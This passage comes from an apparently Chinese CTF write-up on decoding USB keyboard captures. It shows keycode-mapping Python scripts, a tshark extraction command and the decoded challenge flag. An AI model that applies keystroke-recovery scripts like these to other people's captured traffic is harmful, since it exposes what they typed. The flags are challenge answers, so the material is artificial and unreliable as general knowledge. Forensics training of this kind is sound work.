class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<br>         <span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>shiftKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>,<br>     <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>,<br>      <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>,<br>       <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>,<br>        <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>,<br>         <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>,<br>          <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>          <span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br>print(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>题目2：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt内容<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是找到的第三个脚本<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span 